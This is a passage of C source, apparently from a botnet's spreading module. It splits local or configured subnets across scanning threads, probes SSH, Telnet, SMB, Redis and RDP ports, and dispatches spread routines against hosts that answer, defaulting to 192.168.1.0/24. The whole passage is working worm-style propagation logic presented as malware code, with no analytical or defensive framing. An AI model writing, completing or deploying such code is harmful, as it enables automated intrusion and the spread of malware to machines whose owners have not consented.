                spread_smb(bot, ip_str, 445);
            }
        }
        if (a->service_mask & SPREAD_REDIS) {
            if (scan_port_with_timeout(ip_str, 6379, timeout) == 0) {
                spread_redis(bot, ip_str, 6379);
            }
        }
        if (a->service_mask & SPREAD_RDP) {
            if (scan_port_with_timeout(ip_str, 3389, timeout) == 0) {
                spread_rdp(bot, ip_str, 3389);
            }
        }
    }

    return NULL;
}

/* Implements spawn_scan_threads() declared in spread.h (#73).
 * Splits a /24 subnet across SCAN_THREAD_COUNT threads. */
int spawn_scan_threads(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
    /* Parse subnet same as scan_subnet */
    char net[16], mask[4] = {0};
    if (sscanf(subnet, "%15[^/]/%3s", net, mask) < 2) {
        log_error("spawn_scan_threads: invalid subnet '%s'", subnet);
        return -1;
    }
    int prefix = atoi(mask);
    if (prefix < 16 || prefix > 32) {
        log_error("spawn_scan_threads: prefix %d out of range", prefix);
        return -1;
    }

    struct in_addr in;
    if (inet_pton(AF_INET, net, &in) != 1) {
        log_error("spawn_scan_threads: invalid IP %s", net);
        return -1;
    }

    uint32_t host_ip = ntohl(in.s_addr);
    int hosts = (1 << (32 - prefix)) - 2;
    if (hosts > 254) hosts = 254;
    if (hosts < 1) hosts = 1;

    int threads = SCAN_THREAD_COUNT;
    if (threads > hosts) threads = hosts;
    if (threads < 1) threads = 1;

    log_info("spawn_scan_threads: %d threads for %d hosts", threads, hosts);

    int per_thread = (hosts + threads - 1) / threads;
    pthread_t tid[SCAN_THREAD_COUNT];
    scan_thread_arg_t args[SCAN_THREAD_COUNT];

    for (int t = 0; t < threads; t++) {
        args[t].bot = bot;
        args[t].host_ip = host_ip;
        args[t].start = t * per_thread + 1;
        args[t].count = per_thread;
        /* clip last thread to actual remaining hosts */
        if (t == threads - 1) {
            args[t].count = hosts - (t * per_thread);
        }
        args[t].service_mask = service_mask;

        if (pthread_create(&tid[t], NULL, scan_thread_fn, &args[t]) != 0) {
            log_error("spawn_scan_threads: pthread_create failed");
            break;
        }
    }

    /* Wait for all threads */
    for (int t = 0; t < threads; t++) {
        pthread_join(tid[t], NULL);
    }

    return 0;
}

int spread_local(notnet_bot_t *bot) {
    log_info("Local spread cycle started");
    
    /* Resolve peers */
    if (protocol_resolve_peers(bot) == 0 && bot->peer_count > 0) {
        log_info("Using %d peers for spread", bot->peer_count);
    }
    
    /* Scan explicit targets if configured (overrides defaults) */
    if (bot->scan_target_count > 0) {
        log_info("Scanning %d explicit targets", bot->scan_target_count);
        uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
        for (int i = 0; i < bot->scan_target_count && i < 16; i++) {
            scan_subnet(bot, bot->scan_targets[i], all_services);
        }
        return 0;
    }
    
    /* Default: just scan local /24 (not /16) */
    scan_subnet(bot, "192.168.1.0/24",
                SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP);
    
    return 0;
}
